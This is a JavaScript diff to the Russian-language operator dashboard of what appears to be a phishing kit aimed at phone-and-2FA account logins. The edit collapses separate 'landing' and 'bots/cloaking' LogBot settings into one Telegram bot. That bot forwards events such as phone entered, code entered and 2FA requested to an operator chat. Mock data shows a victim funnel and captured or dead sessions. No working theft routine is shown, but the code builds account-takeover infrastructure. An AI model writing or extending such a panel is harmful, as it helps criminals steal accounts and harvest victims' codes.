@@ -470,12 +470,8 @@ const DATA = {
     {id:3,unread:true,icId:'ic-skull',color:'err',title:'+7(903)456·· — сессия мертва',sub:'evil-domain.com · вчера'},
     {id:4,unread:false,icId:'ic-gear',color:'acc',title:'pending-domain.ru — активен',sub:'NS делегированы · 3 дня назад'},
   ],
-  logbot:{
-    land:{connected:true,name:'@land_log_bot',chat:'-1001234567890',
-      triggers:{done:true,phone:true,twofa:true,code:false,bad_code:false,page:false}},
-    bots:{connected:false,name:'@bots_log_bot',chat:'',
-      triggers:{done:true,phone:false,twofa:false,code:false,bad_code:false,page:false}},
-  },
+  logbot:{connected:true,name:'@my_log_bot',chat:'-1001234567890',
+    triggers:{done:true,phone:true,twofa:true,code:false,bad_code:false,page:false}},
   user:{username:'@username',tg_id:5984466650},
   stats:{
     funnel:{clicks:12044,loads:10880,phones:8923,codes:6711,twofa:2344,done:1420},
@@ -1394,11 +1390,8 @@ screens.profile = ()=>{
       <div class="card" onclick="nav.go('notifications')">
         <div class="row between"><span class="row gap-s"><svg class="svgi x18 t-acc"><use href="#ic-bell"/></svg>Уведомления</span><span class="chev">${CHEV}</span></div>
       </div>
-      <div class="card" onclick="nav.go('logbot',{kind:'land'})">
-        <div class="row between"><span class="row gap-s"><svg class="svgi x18 t-acc"><use href="#ic-send"/></svg>LogBot — Лендинги</span><span class="row gap-s">${DATA.logbot.land.connected?'<span class="pill ok">on</span>':'<span class="pill muted">off</span>'}<span class="chev">${CHEV}</span></span></div>
-      </div>
-      <div class="card" onclick="nav.go('logbot',{kind:'bots'})">
-        <div class="row between"><span class="row gap-s"><svg class="svgi x18 t-acc"><use href="#ic-send"/></svg>LogBot — Боты</span><span class="row gap-s">${DATA.logbot.bots.connected?'<span class="pill ok">on</span>':'<span class="pill muted">off</span>'}<span class="chev">${CHEV}</span></span></div>
+      <div class="card" onclick="nav.go('logbot')">
+        <div class="row between"><span class="row gap-s"><svg class="svgi x18 t-acc"><use href="#ic-send"/></svg>LogBot</span><span class="row gap-s">${DATA.logbot.connected?'<span class="pill ok">on</span>':'<span class="pill muted">off</span>'}<span class="chev">${CHEV}</span></span></div>
       </div>
     `
   };
@@ -1587,31 +1580,31 @@ function markAllRead(){
 }
 
 /* ---- LOGBOT ---- */
-const LOGBOT_META={
-  land:{title:'LogBot — Лендинги',sub:'Логи фишинговых лендингов',
-    triggers:[['done','Сессия завершена (done)'],['phone','Телефон введён'],['twofa','2FA запрошена'],['code','Код введён'],['bad_code','Неверный код'],['page','Страница открыта']]},
-  bots:{title:'LogBot — Боты',sub:'Логи трафика ботов / клоакинга',
-    triggers:[['done','Сессия завершена (done)'],['page','Бот открыт'],['phone','Контакт получен'],['bad_code','Заблокирован клоакой']]},
-};
-screens.logbot = (p)=>{
-  const kind = (p&&p.kind&&DATA.logbot[p.kind]) ? p.kind : 'land';
-  const meta = LOGBOT_META[kind];
-  const lb=DATA.logbot[kind];
+screens.logbot = ()=>{
+  const lb=DATA.logbot;
   if(!lb.connected){
     return {
-      title:meta.title, sub:meta.sub, tab:'profile',
+      title:'LogBot', tab:'profile',
       html:`
         <div class="card static">
           <div class="row between"><span class="t-label">Статус</span><span class="pill muted">⭕ Не подключён</span></div>
         </div>
         <div class="field-row"><div class="lbl">Bot Token</div><input class="input" type="password" placeholder="123456789:AAEhhHg..."></div>
         <div class="field-row"><div class="lbl">Chat ID</div><input class="input" placeholder="-1001234567890"></div>
-        <button class="btn" onclick="DATA.logbot['${kind}'].connected=true;nav._render();toast('Подключён')">Подключить</button>
+        <button class="btn" onclick="DATA.logbot.connected=true;nav._render();toast('Подключён')">Подключить</button>
       `
     };
   }
+  const TR=[
+    ['done','Сессия завершена (done)'],
+    ['phone','Телефон введён'],
+    ['twofa','2FA запрошена'],
+    ['code','Код введён'],
+    ['bad_code','Неверный код'],
+    ['page','Страница открыта'],
+  ];
   return {
-    title:meta.title, sub:meta.sub, tab:'profile',
+    title:'LogBot', tab:'profile',
     html:`
       <div class="card static">
         <div class="row between mb-s"><span class="t-label">Статус</span><span class="pill ok">✅ Подключён</span></div>
@@ -1620,13 +1613,13 @@ screens.logbot = (p)=>{
       </div>
       <div class="section-label">Что отправлять</div>
       <div class="card static">
-        ${meta.triggers.map(([k,lbl])=>`<div class="check ${lb.triggers[k]?'on':''}" onclick="DATA.logbot['${kind}'].triggers['${k}']=!DATA.logbot['${kind}'].triggers['${k}'];nav._render()"><span class="box"></span><span>${esc(lbl)}</span></div>`).join('')}
+        ${TR.map(([k,lbl])=>`<div class="check ${lb.triggers[k]?'on':''}" onclick="DATA.logbot.triggers['${k}']=!DATA.logbot.triggers['${k}'];nav._render()"><span class="box"></span><span>${esc(lbl)}</span></div>`).join('')}
       </div>
       <div class="row gap-s mt-m">
         <button class="btn ghost small" onclick="toast('Тестовое отправлено')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-send"/></svg>Тест</button>
         <button class="btn small" onclick="toast('Триггеры сохранены')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-check"/></svg>Сохранить</button>
       </div>
-      <button class="btn danger mt-m" onclick="confirmSheet('Отключить LogBot?','Логи больше не будут отправляться.',()=>{DATA.logbot['${kind}'].connected=false;nav._render();toast('Отключён');},true)"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-x"/></svg>Отключить LogBot</button>
+      <button class="btn danger mt-m" onclick="confirmSheet('Отключить LogBot?','Логи больше не будут отправляться.',()=>{DATA.logbot.connected=false;nav._render();toast('Отключён');},true)"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-x"/></svg>Отключить LogBot</button>
     `
   };
 };
